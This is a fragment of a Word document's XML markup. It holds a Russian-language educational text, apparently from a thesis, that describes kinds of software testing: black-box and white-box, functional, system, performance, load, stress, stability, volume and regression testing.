          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>security</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B420AE" w:rsidRPr="00B420AE" w:rsidRDefault="00B420AE" w:rsidP="00B420AE">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="00B420AE" w:rsidP="0060216E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc10727429"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>1.6</w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> Подробнее о видах тестирования</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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Проверка функциональности (тестирование методом «черного ящика») – проверка соответствия программного обеспечения требованиям, заявленным в спецификации. Может проводиться как полное тестирование заявленной функциональность, так и проверка только базовой функциональности.</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«белого ящика» (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>white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со знанием внутренней структуры реализации системы (есть в наличии исходный код и технические спецификации).</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«черного ящика» (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>black</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без знания внутренней структуры реализации системы.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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функциональности может проводиться в двух аспектах:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:hanging="283"/>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Требования</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:hanging="283"/>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lastRenderedPageBreak/>
        <w:t>Бизнес-процессы</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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«требования» использует спецификацию функциональных требований к системе как основу для дизайна тестовых случаев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xml:space="preserve">). В этом случае необходимо сделать список того, что будет тестироваться, а что нет,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требования на основе рисков (если это не сделано в документе с требованиями), а на основе этого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Это позволит сфокусироваться и не упустить при тестировании наиболее важный функционал.</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scripts</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>), как правило, основываются на случаях использования системы (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>use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Преимущества функционального тестирования:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>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Имитирует фактическое использование системы;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>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Недостатки функционального тестирования:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>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Возможность упущения логических ошибок в программном обеспечении;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>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Вероятность избыточного тестирования.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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22222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Высокоуровневая проверка функционала всей программы или </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>системыв</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> целом.</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w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>использовать окружение максимально приближенное к тому, на которое будет установлен продукт после выдачи.</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Можно выделить два подхода к системному тестированию:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">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 базе требований (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>requirements</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based</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">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Для каждого требования пишутся тестовые случаи (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>test</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cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>), проверяющие выполнение данного требования.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">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 базе случаев использования (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>use</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case</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based</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">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 основе представления о способах использования продукта создаются случаи использования системы (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Use</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Cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>). По конкретному случаю использования можно определить один или более сценариев. На проверку каждого сценария пишутся тест кейсы (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>test</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cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>), которые должны быть протестированы.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Тестирование </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>проиводительности</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performance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которое проводится с целью определения, как быстро работает система или её часть под определённой нагрузкой.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF"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Нагрузочное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>load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5E0F40" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF"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предназначено для проверки работоспособности системы при стандартных нагрузках и для определения максимально возможного пика, при котором система работает правильно.</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> На р</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ис</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>унок 1.2 визуально изображен тест</w:t>
      </w:r>
      <w:r w:rsidR="005E0F40" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> производительности</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B420AE">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val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6872B63F" wp14:editId="13C68487">
            <wp:extent cx="5895975" cy="2400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75" cy="2400300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00B420AE">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w:t>
      </w:r>
      <w:r w:rsidR="005E0F40">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">унок 1.2 - </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Визуальное изображение теста производительности</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В зависимости от характеристик, которые нам нужно протестировать, тестирование производительности делится на типы:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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Нагрузочное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Loadtesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) – тестирование времени отклика приложения на запросы различных типов, с целью удостовериться, что приложение работает в соответствии с требованиями при обычной пользовательской нагрузке.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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Стресс-тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Stresstesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) – тестирование работоспособности приложения при нагрузках, превышающих пользовательские в несколько раз. При стресс-тестировании (зачастую, только при нем) мы можем получить реальные данные границ производительности приложения, исследовать способность программы обрабатывать исключения, ее стабильность и устойчивость. Именно в значительно увеличенной нагрузке на приложение и заключается разница между тестированием производительности и стресс тестированием.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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Тестирование стабильности или наработка на отказ (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Stability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Reliabilitytesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)  исследует</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> работоспособность приложения при длительной работе во времени, при нормальной для программы нагрузке.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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Объемное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>VolumeTesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) – тестирование проводится с увеличением не нагрузки и времени работы, а количества используемых данных, которые хранятся и используются в приложении.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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Очень часто при определении тестирования производительности и его типах приходят к ошибочному пониманию и путанице данных терминов. Чтобы избежать этого и закрепить полученные знания, подведем итог. Итак, тестирование производительности – это проверка таких нефункциональных требований, как производительность и работоспособность приложения при различных нагрузках и условиях. В зависимости от исследуемой характеристики программы, мы можем выделить такие типы тестирования как:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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Нагрузочное тестирование (производительность при нормальных условиях).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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lastRenderedPageBreak/>
        <w:t>Стресс-тестирование (работоспособность, производительность и характеристики приложения при экстремальных нагрузках).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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Тестирование стабильности (при длительной работе).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE"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Объемное тестирование (при увеличенных объемах обрабатываемых данных).</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Регрессионное тестирование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Регрессионное тестирование - это </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>вид тестирования</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">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(см. также Санитарное тестирование или проверка согласованности/исправности). Регрессионными могут быть как функциональные, так и нефункциональные тесты.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Как правило, для регрессионного тестирования используются тест кейсы, написанные на ранних стадиях разработки и тестирования. Это дает гарантию того, что изменения в новой версии приложения не повредили уже существующую функциональность. Рекомендуется делать автоматизацию регрессионных тестов, для ускорения последующего процесса тестирования и обнаружения дефектов на ранних стадиях разработки программного обеспечения.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Сам по себе термин "Регрессионное тестирование", в зависимости от контекста использования может иметь разный смысл. Сэм </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Канер</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, к примеру, описал 3 основных типа регрессионного тестирования:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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багов (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Bug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исправленная ошибка на самом деле не исправлена</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
